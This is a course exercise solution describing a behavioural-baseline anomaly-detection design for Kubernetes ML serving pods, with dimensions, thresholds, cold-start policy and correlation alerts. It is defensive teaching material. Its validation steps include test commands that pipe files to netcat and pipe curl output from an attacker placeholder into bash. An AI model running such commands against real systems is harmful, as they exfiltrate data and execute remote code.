# SOLUTION — Exercise 04: Behavioral Baseline Design

> Read this *after* attempting the exercise. The design below is one defensible
> answer; a real production design must validate thresholds against measured
> data from your own deployments, not assumed numbers.

---

## 1. Solution overview

Exercise 03's Falco rules catch **named patterns** — model writes, shells in
production, IMDS access. This exercise adds the layer that catches **unnamed
deviations from normal**: a serving pod that suddenly opens 100 outbound
connections per minute, a process tree five levels deeper than it has ever
been, a memory-utilization curve that doesn't match the baseline distribution.

The design has six parts:

1. **Dimensions** — what to measure and why.
2. **Learning windows** — how long to observe before alerting, and when to
   re-learn.
3. **Alert thresholds** — what triggers a signal.
4. **Cold-start strategy** — how to handle workloads with no history.
5. **Cross-dimension correlation** — how to lift the signal:noise ratio.
6. **Operational concerns** — where the baselines live, who owns them.

The framing aligns with NIST AI RMF's `MEASURE` function (continuously
characterize AI system behavior to detect deviation) and ATLAS's
`Initial Access → Execution → Exfiltration` chain (single-dimension alerts
are weak across the chain; correlation across dimensions is what catches it).

The numeric thresholds below are starting points calibrated to typical
serving-workload behaviour; treat them as defaults to tune from, not as
measurements.

## 2. Worked answer / implementation

### 2.1 Dimensions to baseline

| # | Dimension | Source | Why it matters for ML threats | Baseline method |
|---|---|---|---|---|
| D1 | Outbound destinations (host:port) | Cilium Hubble flow logs (or VPC flow logs) | Exfiltration of model weights, training data, or inference inputs uses egress paths the pod has never used before. Egress is the highest-signal dimension. | Per-deployment **set** of (host, port) tuples observed in the learning window. Alert on first-seen out of set, sustained ≥ 30 s. |
| D2 | Request rate (RPS per pod) | Envoy / mesh metrics → Prometheus | Sudden bursts can indicate a flooding attack, prompt-injection probing, or a runaway client. | Per-pod EMA (half-life 5 min) of request count; baseline distribution recorded as p50 / p95 / p99 over 7 days. |
| D3 | CPU utilization | cAdvisor → Prometheus | Crypto-mining sidecars, model-inversion attack scripts, malicious model preprocessing all show as CPU outliers. | Per-pod IQR over rolling 7-day window; the baseline is the per-deployment median of per-pod medians and the per-deployment p99. |
| D4 | Memory utilization | cAdvisor → Prometheus | Memory-bloat from injected payloads, large-prompt attacks. | Same as CPU (IQR-based percentile). |
| D5 | GPU utilization | DCGM exporter → Prometheus | A pod whose GPU goes to 100% outside training windows is suspect; idle GPU on a serving pod that should be hot is also a signal. | Per-pod EMA + per-deployment p99. Combined with the schedule annotation from Exercise 03 R007. |
| D6 | Process tree depth | Tetragon process events | Reverse shells / dropper scripts produce deeper trees than the workload's normal launcher → app → worker pattern. | Per-deployment **mode** of (max depth observed per 1 min window). Alert on depth > mode + 2 for ≥ 60 s. |
| D7 | Syscall frequency profile (high-level) | Falco syscall counts (or eBPF) | A workload that suddenly uses 3× the historical `execve` rate is doing something new. | Per-deployment **vector** of (syscall_family → calls/sec) computed over 1-min windows, baselined as the per-family median + IQR over 7 days. |
| D8 | Network connection breadth | Cilium Hubble → Prometheus aggregation | Count of unique destination IPs per minute. Distinguishes "talks to feature-store" (low breadth) from "scanning the cluster" (high breadth). | Per-pod p99 of unique-dest-per-minute over 7 days. |

Stopping at 8 because each new dimension adds another tuning surface; the
return curve flattens around 6–8 for a typical serving workload.

### 2.2 Learning windows

**Initial learning window: 7 days.**

7 days catches the weekly cycle (lower load on weekends, batch jobs that run
overnight or weekly). Less and you bake in a single day's distribution; more
and you stall the alerting layer too long for new deployments.

**Re-learning triggers:**

| Trigger | Action |
|---|---|
| Deployment of a new container image (any digest change) | Treat as new workload — restart learning window, hold thresholds at the previous baseline + 50% headroom. |
| HPA replica count changes by >2× | Recompute per-pod thresholds; deployment-level thresholds carry over. |
| Config map change that the workload consumes | Hold thresholds (the change may legitimately shift behaviour); re-evaluate at +24 h and full re-learn if drift persists. |
| Periodic refresh | 7-day rolling baseline updates every 24 h. |
| Manual trigger | An on-call can force re-learn after a confirmed false-positive cluster. |

**Drift detection.** Compare the most recent 24-h sample to the prior 7-day
baseline distribution via a Kolmogorov–Smirnov test (D-statistic > 0.2 for
two consecutive 24-h samples = "drifted"). Drift triggers a re-learn,
**not** an alert — drift is normal; surprise alerts on drift are what
produce alert fatigue.

### 2.3 Alert thresholds

For each dimension, the threshold expression uses one of three
methods — pick the one that fits the distribution shape:

| Dimension | Method | Threshold | Confidence rule |
|---|---|---|---|
| D1 (outbound destinations) | Set-membership | First-seen (host,port) outside baseline set | Sustained ≥ 30 s **AND** byte volume > 1 KiB. |
| D2 (RPS) | Percentile + EMA | EMA > baseline p99 × 1.5 | Sustained ≥ 5 min. |
| D3 (CPU) | Percentile | Per-pod usage > deployment p99 + 2× IQR | Sustained ≥ 10 min. |
| D4 (memory) | Percentile | Per-pod usage > deployment p99 + 2× IQR | Sustained ≥ 10 min. |
| D5 (GPU) | Schedule + percentile | (`gpu_window_active=false`) AND util > 5% for ≥ 60 s, OR util > deployment p99 for ≥ 10 min during window. | Sustained windows are key — single spikes are CUDA warm-up. |
| D6 (proc-tree depth) | Mode + offset | depth > baseline mode + 2 | Sustained ≥ 60 s. |
| D7 (syscall profile) | Per-family percentile | (syscall_family_rate) > baseline p99 + 3× IQR for that family | Sustained ≥ 5 min. |
| D8 (connection breadth) | Percentile | unique_dest_per_min > deployment p99 × 2 | Sustained ≥ 5 min. |

Three rules of thumb the table encodes:

- **Sustained-over-time over single outliers.** Every dimension has a
  duration condition. Alerting on a single 1-second outlier is the fastest
  path to alert fatigue.
- **Per-deployment baselines for distribution shape; per-pod thresholds for
  evaluation.** The baseline distribution is computed across the deployment
  (more samples → more stable percentiles), but evaluation is per-pod so a
  single compromised pod isn't masked by 9 healthy siblings.
- **IQR over standard deviation** for non-normal distributions (CPU,
  memory, syscall counts are right-tailed). σ-based thresholds over-alert
  for these.

### 2.4 Cold-start handling

A new deployment has no baseline. Three options exist; use a *combination*,
not just one:

| Strategy | When applied | Trade-off |
|---|---|---|
| Workload-class default baseline | Day 0–1 | Approximates safety quickly; loses per-deployment fidelity. The "workload class" is a small enum: `serving`, `training`, `notebook`, `feature-store`, `gov`. |
| Conservative bound (5σ-equivalent) | Day 1–7 | Wider thresholds catch only egregious anomalies; misses subtle compromise during the learning window. |
| Alerts disabled (SIEM-only) for D2/D3/D4/D7 | Day 0–3 | Eliminates noise during the noisiest period; doesn't catch real attacks landing on day 1. |
| Alerts always live for D1 (egress destinations) | Day 0 onward | Egress to a new host is high-signal even on day 0; the cost of an extra alert is low. |

**Concrete cold-start policy for a new SmartRecs deployment:**

- **D1** active immediately, seeded from the deployment's declared egress
  allow-list (NetworkPolicy).
- **D2, D3, D4, D7** suppressed for 72 h, with class-default conservative
  bounds active and SIEM-routed only.
- **D5** active immediately using the schedule-annotation guard.
- **D6** active after 24 h with the class default (`mode = 3`).
- **D8** suppressed for 72 h.
- At 7 days: switch all dimensions to per-deployment baselines.

Document the suppression in the deployment manifest annotation
`smartrecs.io/baseline-learning-until=<timestamp>`, so the alerting layer
knows the state without out-of-band lookup.

### 2.5 Cross-dimension correlations

Single-dimension alerts are the noise layer; multi-dimension correlations
are the signal. Three correlations to wire:

#### C1 — Egress + CPU spike together (exfiltration during compression)

```
ALERT exfil_with_compression
  WHEN (D1: new outbound destination, sustained 30 s)
   AND (D3: per-pod CPU > p99 + 2*IQR, same 30 s window)
PRIORITY high
RATIONALE Exfil staging typically compresses the payload before egress.
```

The CPU spike on its own is uninformative (could be a request burst); the
egress on its own is uninformative (could be a new pip mirror added
yesterday). Together they describe a behaviour the workload has not
exhibited in 7 days.

#### C2 — Request rate + memory spike together (large-prompt / memory-exhaustion)

```
ALERT large_request_abuse
  WHEN (D2: RPS > baseline p99 * 1.5)
   AND (D4: per-pod memory > deployment p99 + 2*IQR)
   AND sustained 5 min
PRIORITY high
RATIONALE Prompt-injection or memory-exhaustion attacks show as concurrent
RPS and memory growth.
```

#### C3 — Process tree depth + outbound destination together (reverse-shell + C2 callback)

```
ALERT shell_with_callback
  WHEN (D6: process tree depth > baseline mode + 2, sustained 60 s)
   AND (D1: new outbound destination during the same window)
PRIORITY critical
RATIONALE A new child process and a new egress destination in the same
window is the canonical RCE → C2 callback signature.
```

Each correlation alert is itself a Falco rule (consuming Falco events) or a
Prometheus alerting rule (consuming metric anomalies routed through
Alertmanager), depending on which dimensions are involved. Cross-dimension
alerts are the only signals routed to PagerDuty out of this layer.

### 2.6 Operational concerns

**Where baselines are stored.**
Prometheus recording rules write 24-h, 7-d, and 30-d percentiles to a
long-term Prometheus (Thanos / Mimir / VictoriaMetrics). For the
set-valued baseline (D1's allowed-egress set), a Postgres table in the
governance namespace holds (deployment, dest, first_seen, last_seen);
Cilium Hubble flow records feed it nightly.

**Re-learning compute cost.**
Re-computing the 7-day baselines for ~50 deployments is one query per
deployment × 8 dimensions × <1 s per query → bounded by Prometheus
ingestion lag, not by the alerting layer. The K-S drift check is more
expensive (sample comparison) — schedule it nightly, not continuously.

**Per-deployment vs. per-pod.**
Baseline distributions live at the deployment level (more samples →
stable percentiles). Threshold *evaluation* is per-pod. This catches a
single compromised pod that's hiding behind 9 healthy siblings.

**Audit-chain integration.**
Every alert (single- or cross-dimension) is shipped to the audit chain
with: `event.id`, `event.rule`, `event.deployment`, `event.pod`,
`event.dimension`, `event.value`, `event.baseline_method`,
`event.threshold`. Cross-dimension alerts also carry `event.children`
referencing the contributing single-dimension events; the audit chain
preserves the relationship for compliance review (NIST AI RMF MEASURE
2.2 calls for traceable detection evidence).

### 2.7 This layer vs. Falco rules (Exercise 03)

| Catches | Exercise 03 (Falco rules) | This (behavioural baseline) |
|---|---|---|
| Named patterns (shell-in-prod, IMDS access) | yes | no — not its job |
| Egress to a new destination | partial (only if the destination triggers a known pattern) | yes |
| Process tree deepening | no | yes |
| Resource-utilization anomalies (CPU/mem/GPU) | no | yes |
| Cross-dimension correlations | no | yes |
| Novel TTPs not yet captured in a rule | no | yes (the entire purpose) |
| Low-FP, high-signal canonical events | yes | weaker — anomaly layers always have higher FP than rules |

Operationally: Falco produces *page-worthy* events with known root cause;
behavioural baselines produce *investigation-worthy* events. The on-call
needs both layers because the threats they catch are disjoint.

## 3. Validation steps

1. **Validate dimension wiring** — for each of D1–D8, run a one-line
   PromQL or Hubble query that returns the latest value for a known
   deployment. If the query returns no data, the dimension isn't wired
   end-to-end.
2. **Validate baseline computation** — for D2, D3, D4, D5, D7, D8: pick a
   deployment with > 7 days of data; manually compute the p99 over the
   last 7 days from a Prometheus export; confirm it matches the recording
   rule's value to within 1%.
3. **Validate drift detection** — synthetically shift one dimension's
   distribution (e.g., scale a Helm value so the new image uses 30% more
   CPU); confirm K-S drift fires within 48 h and triggers a re-learn,
   *not* an alert.
4. **Cold-start replay** — deploy a brand-new namespace+workload and
   verify suppression annotations honour the §2.4 schedule.
5. **Cross-dimension alert tests** — synthetically generate each
   correlation:
   - C1: from a serving pod, run `tar c /tmp | nc <new-dest> 9999`.
   - C2: load-test a serving pod with prompts of 100× the normal size.
   - C3: `kubectl exec` into a serving pod, run `bash -c "curl
     <attacker> | bash"`.
   Each must page within 5 min via the correlation rule.
6. **False-positive replay** — generate isolated single-dimension
   anomalies (just a CPU spike, just a new egress destination); confirm
   they generate SIEM events but **do not** page. This protects against
   the "we lowered the threshold for safety" failure mode.

## 4. Rubric / review checklist

- [ ] **≥ 6 dimensions** defined with source, ML-threat rationale, and
      baseline method.
- [ ] **Baseline method per dimension** is concrete (EMA half-life,
      IQR, set membership) — not "we'll use anomaly detection."
- [ ] **Thresholds are numeric**, not "tune later."
- [ ] **Every threshold has a duration condition** to suppress single-
      sample outliers.
- [ ] **Cold-start policy** uses a *combination* of class-default,
      conservative bound, and suppression — not just one.
- [ ] **At least 3 cross-dimension correlation alerts** with plausible
      signal (each one names *which* attack pattern it targets).
- [ ] **Drift detection ≠ alerting.** Drift triggers re-learning, not
      an incident page.
- [ ] **Re-learning triggers** include deployment, scale, config, and
      periodic.
- [ ] **Per-deployment baselines / per-pod evaluation** is named
      explicitly.
- [ ] **Audit-chain integration** lists the fields shipped per alert.
- [ ] **Comparison with the rule layer** is honest about which threats
      each catches.

## 5. Common mistakes

- **"We'll detect anomalies."** Without specifying dimensions, baseline
  methods, and thresholds, this is not a design — it's an aspiration.
  Every anomaly framework needs the four numeric concepts (window,
  method, threshold, duration) for every dimension.
- **σ-based thresholds on non-normal data.** CPU, memory, syscall counts
  are right-tailed; ±3σ over-alerts on the noisy upper tail. Use IQR-
  based or percentile-based thresholds instead.
- **Single-dimension alerting only.** Every dimension produces some
  noise; the rate of co-occurring noise across two unrelated dimensions
  is much lower. Cross-correlation is where the signal lives.
- **No re-learning strategy.** The baseline goes stale within weeks as
  the workload evolves; thresholds start firing on legitimate behavior;
  the team disables the alerts. Schedule the re-learn.
- **Alerting on drift.** Drift is normal and continuous. Alerts on drift
  exhaust the on-call. Drift should trigger re-learning, not paging.
- **Computing baselines per-pod from the start.** A new pod has 0
  samples; thresholds are meaningless. Compute at the deployment level
  (more samples), evaluate at the pod level.
- **Suppressing all alerts during cold start.** Attacks landing on day 1
  go unnoticed. Keep D1 (egress destinations) active immediately;
  selectively suppress dimensions that are noisy-by-nature.
- **Treating this layer as a replacement for Falco rules.** Anomaly
  detection has higher FP than pattern detection; both are needed for
  different purposes. The §2.7 table makes this explicit.

## 6. References

- NIST AI Risk Management Framework — MEASURE function (continuous
  measurement and characterization of AI system behaviour).
  <https://www.nist.gov/itl/ai-risk-management-framework>
- OWASP Machine Learning Security Top 10 — ML06 (Model Theft), ML10
  (Data Leakage) — the exfiltration-class threats the egress and
  cross-dimension correlations target.
  <https://owasp.org/www-project-machine-learning-security-top-10/>
- MITRE ATLAS — adversary tactics matrix for ML systems; behavioural
  baselines support the Detect-and-Respond posture across Initial Access
  → Execution → Exfiltration.
  <https://atlas.mitre.org/>
- Prometheus recording rules — how baseline percentiles are precomputed.
  <https://prometheus.io/docs/prometheus/latest/configuration/recording_rules/>
- Cilium Hubble — flow-log source for D1 and D8.
  <https://docs.cilium.io/en/stable/observability/hubble/>
- Tetragon — process-event source for D6.
  <https://tetragon.io/docs/>
- NIST SP 800-190 — runtime threat model that grounds the dimension
  selection.
  <https://csrc.nist.gov/pubs/sp/800/190/final>
- Module 08 lecture notes §7 (Behavioral analytics) and §9 (ML-specific
  runtime threats).
